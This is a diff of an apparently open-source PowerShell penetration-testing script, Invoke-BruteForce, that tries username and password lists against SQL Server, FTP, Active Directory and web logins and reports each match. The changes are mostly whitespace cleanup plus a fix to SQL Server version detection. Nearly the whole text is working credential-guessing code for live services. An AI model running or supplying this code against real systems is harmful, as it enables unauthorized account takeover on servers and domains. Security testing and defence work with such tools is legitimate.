@@ -1,5 +1,5 @@
 ﻿
-function Invoke-BruteForce 
+function Invoke-BruteForce
 {
   <#
 .SYNOPSIS
@@ -67,7 +67,7 @@ Goude 2012, TreuSec
         $StopOnSuccess
     )
 
-    Process 
+    Process
     {
         $usernames = Get-Content $UserList
         $passwords = Get-Content $PasswordList
@@ -84,26 +84,27 @@ Goude 2012, TreuSec
             {
                 $success = $false
             }
-            if($success -eq $true) 
+            if($success -eq $true)
             {
                 Write-Output "Match found! $username : $Password"
                 switch ($connection.ServerVersion) {
                     { $_ -match "^6" } { "SQL Server 6.5";Break UsernameLoop }
-                    { $_ -match "^6" } { "SQL Server 7";Break UsernameLoop }
+                    { $_ -match "^7" } { "SQL Server 7";Break UsernameLoop }
                     { $_ -match "^8" } { "SQL Server 2000";Break UsernameLoop }
                     { $_ -match "^9" } { "SQL Server 2005";Break UsernameLoop }
                     { $_ -match "^10\.00" } { "SQL Server 2008";Break UsernameLoop }
                     { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break UsernameLoop }
                     { $_ -match "^11" } { "SQL Server 2012";Break UsernameLoop }
                     { $_ -match "^12" } { "SQL Server 2014";Break UsernameLoop }
+                    { $_ -match "^13" } { "SQL Server 2016";Break UsernameLoop }
                     Default { "Unknown" }
                 }
-            } 
+            }
         }
-        if($service -eq "SQL") 
+        if($service -eq "SQL")
         {
             Write-Output "Brute Forcing SQL Service on $ComputerName"
-            if($userList) 
+            if($userList)
             {
                 :UsernameLoop foreach ($username in $usernames)
                 {
@@ -114,24 +115,24 @@ Goude 2012, TreuSec
                         CheckForSQLSuccess
                     }
                 }
-            } 
-            else 
+            }
+            else
             {
                 #If no username is provided, use trusted connection
                 $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
                 CheckForSQLSuccess
 
             }
-        } 
+        }
 
         #Brute Force FTP
         elseif ($service -eq "FTP")
         {
-            if($ComputerName -notMatch "^ftp://") 
+            if($ComputerName -notMatch "^ftp://")
             {
                 $source = "ftp://" + $ComputerName
             }
-            else 
+            else
             {
                 $source = $ComputerName
             }
@@ -141,7 +142,7 @@ Goude 2012, TreuSec
             {
                 foreach ($Password in $Passwords)
                 {
-                    try 
+                    try
                     {
                         $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
                         $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
@@ -157,52 +158,52 @@ Goude 2012, TreuSec
                         }
                     }
 
-                    catch 
+                    catch
                     {
                         $message = $error[0].ToString()
                         $success = $false
                     }
                 }
-            } 
+            }
         }
 
         #Brute Force Active Directory
-        elseif ($service -eq "ActiveDirectory") 
+        elseif ($service -eq "ActiveDirectory")
         {
             Write-Output "Brute Forcing Active Directory $ComputerName"
             Add-Type -AssemblyName System.DirectoryServices.AccountManagement
             $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
-            Try 
+            Try
             {
                 $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
                 $success = $true
             }
-            Catch 
+            Catch
             {
                 $message = "Unable to contact Domain"
                 $success = $false
             }
-            if($success -ne $false) 
+            if($success -ne $false)
             {
                 :UsernameLoop foreach ($username in $usernames)
                 {
                     foreach ($Password in $Passwords)
                     {
-                        Try 
+                        Try
                         {
                             Write-Verbose "Checking $userName : $password"
                             $success = $principalContext.ValidateCredentials($username, $password)
                             $message = "Password Match"
                             if ($success -eq $true)
                             {
-                                Write-Output "Match found! $username : $Password"                        
+                                Write-Output "Match found! $username : $Password"
                                 if ($StopOnSuccess)
                                 {
                                     break UsernameLoop
                                 }
                             }
                         }
-                        Catch 
+                        Catch
                         {
                             $success = $false
                             $message = "Password doesn't match"
@@ -212,13 +213,13 @@ Goude 2012, TreuSec
             }
         }
         #Brute Force Web
-        elseif ($service -eq "Web") 
+        elseif ($service -eq "Web")
         {
             if ($ComputerName -notMatch "^(http|https)://")
             {
                 $source = "http://" + $ComputerName
-            } 
-            else 
+            }
+            else
             {
                 $source = $ComputerName
             }
@@ -230,7 +231,7 @@ Goude 2012, TreuSec
                     $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
                     $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
                     $webClient.Credentials = $credential
-                    Try 
+                    Try
                     {
                         Write-Verbose "Checking $userName : $password"
                         $source
@@ -239,14 +240,14 @@ Goude 2012, TreuSec
                         $success
                         if ($success -eq $true)
                         {
-                            Write-Output "Match found! $Username : $Password"                        
+                            Write-Output "Match found! $Username : $Password"
                             if ($StopOnSuccess)
                             {
                                 break UsernameLoop
                             }
                         }
                     }
-                    Catch 
+                    Catch
                     {
                         $success = $false
                         $message = "Password doesn't match"
